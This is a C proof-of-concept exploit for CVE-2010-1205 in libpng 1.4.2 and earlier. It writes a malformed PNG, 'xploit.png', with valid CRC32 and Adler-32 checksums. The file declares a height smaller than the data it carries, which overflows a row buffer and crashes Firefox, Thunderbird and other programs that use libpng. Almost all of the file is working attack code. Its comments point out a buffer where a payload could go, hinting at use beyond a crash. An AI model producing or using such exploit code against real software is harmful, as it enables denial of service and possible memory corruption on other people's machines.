/*
 Exploit Title:     libpng <= 1.4.2 DoS
 Date:              July 20, 2010
 Author:            kripthor
 Software Link:     http://www.libpng.org/pub/png/libpng.html
 Version:           all products that use libpng <= 1.4.2
 Tested on:         Windows XP Pro SP3 Eng / Ubuntu 10
 CVE :				CVE-2010-1205
 Notes:             This crashes Firefox <= 3.6.6 and Thunderbird <= 3.0.4
					inkscape, png2html, etc...
  					ALL products that use libpng <= 1.4.2 maybe vulnerable.

 References:
  					libpng.org
  					RFC-2083
  					RFC 1950
  					RFC 1951
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <assert.h>
#include <unistd.h>


#define BASE 65521L /* largest prime smaller than 65536 */

      /*
         Update a running Adler-32 checksum with the bytes buf[0..len-1]
       and return the updated checksum. The Adler-32 checksum should be
       initialized to 1.

       Usage example:

         unsigned long adler = 1L;

         while (read_buffer(buffer, length) != EOF) {
           adler = update_adler32(adler, buffer, length);
         }
         if (adler != original_adler) error();
      */
      unsigned long update_adler32(unsigned long adler, unsigned char *buf, int len)
      {
        unsigned long s1 = adler & 0xffff;
        unsigned long s2 = (adler >> 16) & 0xffff;
        int n;

        for (n = 0; n < len; n++) {
          s1 = (s1 + buf[n]) % BASE;
          s2 = (s2 + s1)     % BASE;
        }
        return (s2 << 16) + s1;
      }

      /* Return the adler32 of the bytes buf[0..len-1] */

      unsigned long adler32(unsigned char *buf, int len)
      {
        return update_adler32(1L, buf, len);
      }


/* CRC based on implementation by Finn Yannick Jacobs */
/* crc_tab[] -- this crcTable is being build by chksum_crc32GenTab().
 *		so make sure, you call it before using the other
 *		functions!
 */
u_int32_t crc_tab[256];

/* chksum_crc() -- to a given block, this one calculates the
 *				crc32-checksum until the length is
 *				reached. the crc32-checksum will be
 *				the result.
 */
unsigned int chksum_crc32 (char *block, unsigned int length)
{
   register unsigned long crc;
   unsigned long i;

   crc = 0xFFFFFFFF;
   for (i = 0; i < length; i++)
   {
      crc = ((crc >> 8) & 0x00FFFFFF) ^ crc_tab[(crc ^ *block++) & 0xFF];
   }
   return (crc ^ 0xFFFFFFFF);
}

/* chksum_crc32gentab() --      to a global crc_tab[256], this one will
 *				calculate the crcTable for crc32-checksums.
 *				it is generated to the polynom [..]
 */

void chksum_crc32gentab ()
{
   unsigned long crc, poly;
   int i, j;

   poly = 0xEDB88320L;
   for (i = 0; i < 256; i++)
   {
      crc = i;
      for (j = 8; j > 0; j--)
      {
	 if (crc & 1)
	 {
	    crc = (crc >> 1) ^ poly;
	 }
	 else
	 {
	    crc >>= 1;
	 }
      }
      crc_tab[i] = crc;
   }
}


int main(void) {

chksum_crc32gentab();

// VALID PNG FILE BEGINS

//PNG FILE SIGNATURE
char PNG_SIGN[] = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a";
// IHDR CHUNCK size
char PNG_IHDR_SIZE[] = "\x00\x00\x00\x0d";
// IHDR CHUNCK IHDR string id
char PNG_IHDR[] = "IHDR";
// IMAGE WIDTH 4 bytes
char PNG_IHDR_WIDTH[] = "\x00\x00\x00\x10";
// IMAGE HEIGTH 4 bytes
char PNG_IHDR_HEIGHT[] = "\x00\x00\x00\x02";
// IMAGE ATTRS 5 bytes: bit depth, color type, compression, filter and interlace method
char PNG_IHDR_ATTRS[] = "\x08\x06\x00\x00\x00";
// CRC32 excluding size!
//char PNG_IHDR_CRC32[] = "\x51\xed\x5c\xf1";

// OTHER FIELDS sRGB, pHYs, tIME
char PNG_OTHER_FIELDS[] ="\x00\x00\x00\x01\x73\x52\x47\x42\x00\xae\xce\x1c\xe9\x00\x00\x00\x09\x70\x48\x59\x73\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x07\x74\x49\x4d\x45\x07\xda\x07\x0c\x14\x1c\x38\x52\xdd\x18\x2e";

// IDAT CHUNCK SIZE
char PNG_IDAT_SIZE[] = "\x00\x00\x00\x8d";
// IDAT CHUNCK IDAT string id
char PNG_IDAT[] = "IDAT";
// data in zlib format!
char PNG_IDAT_DATA_ZLIB_HEADER[] = "\x08\x1d\x01\x82\x00\x7d\xff";
// zlib content, size in RGBa with no compression = height*width*4;
//char PNG_IDAT_DATA_ZLIB_CONTENT[] = "\x01\xff\x00\x00\xff\x01\xff\x30\x00\x00\x01\xcf\x00\x2b\x2a\x2b\x00\x11\x12\x11\x00\x10\x10\x11\x00\x11\x11\x11\x00\x11\x11\x11\x00\x11\x11\x12\x00\x11\x11\x10\x00\x11\x11\x10\x00\x11\x11\x12\x00\x10\x11\x11\x00\x11\x11\x11\x00\x12\x11\x10\x00\x10\x10\x11\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\xff\xff\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff\x00\x00\x00\x01\x00\xff\x00\x01\x00\x00\x00\xff\xff\x01\x00\x01\x01\x00\x00";
// adler32 of zlib_content
//char PNG_IDAT_DATA_ZLIB_ADLER32[] = "\xb1\xa6\x0d\xe5";

// CRC32 excluding size!
//char PNG_IDAT_CRC32[] = "\x88\x3b\xb3\xfe";

// IEND CHUNCK
char PNG_IEND_CHUNCK[] = "\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82";

// VALID PNG FILE ENDS




//-----------------------------------------------------------------------------------
//---------------------------------
// TRIGGER OVERFLOW.
// WE ARE GOING TO CREATE A PNG WITH 2 ROWS AND MARK IT AS HAVING 1 ROW
// OUR BUFFER CAN BE width*height*4+height in size

// CHOOSE A WIDTH (crashes occur around 512 width)
int WIDTH = 700;
unsigned int w = htonl(WIDTH);
memcpy(PNG_IHDR_WIDTH,&w,4);

int HEIGHT = 2;
// TRIGGER OVERFLOW REPORT HEIGHT-1 IN THE HEADER
unsigned int h = htonl(HEIGHT-1);
memcpy(PNG_IHDR_HEIGHT,&h,4);

// USE THIS BUFFER FOR YOUR PWNSAUCE ?
int idat_zlib_data_size = WIDTH*HEIGHT*4+HEIGHT;
unsigned char *buf = malloc(idat_zlib_data_size);
memset(buf,0x41,idat_zlib_data_size);
// USE THIS BUFFER FOR YOUR PWNSAUCE ?

// FIX ZLIB HEADERS IN THE IDAT BLOCK
short int zblock_size = (short int) idat_zlib_data_size;
short int zblock_size_2c = -zblock_size-1;
memcpy(PNG_IDAT_DATA_ZLIB_HEADER+3,&zblock_size,2);
memcpy(PNG_IDAT_DATA_ZLIB_HEADER+5,&zblock_size_2c,2);

unsigned int idat_new_size = htonl(idat_zlib_data_size+11);
memcpy(PNG_IDAT_SIZE,&idat_new_size,4);

//---------------------------------
//-----------------------------------------------------------------------------------




FILE * f;

f = fopen ( "xploit.png" , "wb" );
fwrite (PNG_SIGN , 1 , sizeof(PNG_SIGN)-1 , f );
fwrite (PNG_IHDR_SIZE , 1 , sizeof(PNG_IHDR_SIZE)-1 , f );
fwrite (PNG_IHDR , 1 , sizeof(PNG_IHDR)-1 , f );
fwrite (PNG_IHDR_WIDTH , 1 , sizeof(PNG_IHDR_WIDTH)-1 , f );
fwrite (PNG_IHDR_HEIGHT , 1 , sizeof(PNG_IHDR_HEIGHT)-1 , f );
fwrite (PNG_IHDR_ATTRS , 1 , sizeof(PNG_IHDR_ATTRS)-1 , f );

//fwrite (PNG_IHDR_CRC32 , 1 , sizeof(PNG_IHDR_CRC32)-1 , f );
//CALCULATE NEW CRC
int ihdr_data_size = sizeof(PNG_IHDR)-1+sizeof(PNG_IHDR_WIDTH)-1+sizeof(PNG_IHDR_HEIGHT)-1+sizeof(PNG_IHDR_ATTRS)-1;
char* ihdr_data = malloc(ihdr_data_size);
memcpy(ihdr_data,PNG_IHDR,sizeof(PNG_IHDR)-1);
memcpy(ihdr_data+sizeof(PNG_IHDR)-1,PNG_IHDR_WIDTH,sizeof(PNG_IHDR_WIDTH)-1);
memcpy(ihdr_data+sizeof(PNG_IHDR)-1+sizeof(PNG_IHDR_WIDTH)-1,PNG_IHDR_HEIGHT,sizeof(PNG_IHDR_HEIGHT)-1);
memcpy(ihdr_data+sizeof(PNG_IHDR)-1+sizeof(PNG_IHDR_WIDTH)-1+sizeof(PNG_IHDR_HEIGHT)-1,PNG_IHDR_ATTRS,sizeof(PNG_IHDR_ATTRS)-1);
unsigned int crc32_ihdr = htonl(chksum_crc32(ihdr_data,ihdr_data_size));
fwrite ( &crc32_ihdr, 1 , 4 , f );

fwrite (PNG_OTHER_FIELDS , 1 , sizeof(PNG_OTHER_FIELDS)-1 , f );

fwrite (PNG_IDAT_SIZE , 1 , sizeof(PNG_IDAT_SIZE)-1 , f );
fwrite (PNG_IDAT , 1 , sizeof(PNG_IDAT)-1 , f );
fwrite (PNG_IDAT_DATA_ZLIB_HEADER , 1 , sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1 , f );
fwrite (buf , 1 ,idat_zlib_data_size,f);

//CALCULATE NEW ADLER-32 FOR ZLIB DATA
unsigned int adler32_zlib_data = htonl(adler32(buf,idat_zlib_data_size));
fwrite ( &adler32_zlib_data, 1 , 4 , f );


//CALCULATE NEW CRC
int idat_data_size = sizeof(PNG_IDAT)-1+sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1+idat_zlib_data_size+4;
char* idat_data = malloc(idat_data_size);
memcpy(idat_data,PNG_IDAT,sizeof(PNG_IDAT)-1);
memcpy(idat_data+sizeof(PNG_IDAT)-1,PNG_IDAT_DATA_ZLIB_HEADER,sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1);
memcpy(idat_data+sizeof(PNG_IDAT)-1+sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1,buf,idat_zlib_data_size);
memcpy(idat_data+sizeof(PNG_IDAT)-1+sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1+idat_zlib_data_size,&adler32_zlib_data,4);
unsigned int crc32_idat = htonl(chksum_crc32(idat_data,idat_data_size));
fwrite ( &crc32_idat, 1 , 4 , f );

fwrite (PNG_IEND_CHUNCK , 1 , sizeof(PNG_IEND_CHUNCK)-1 , f );
fclose (f);

//OPEN XPLOIT.PNG WITH YOUR FAVORITE BROWSER/IMAGE EDIT APP/ETC

return 0;


}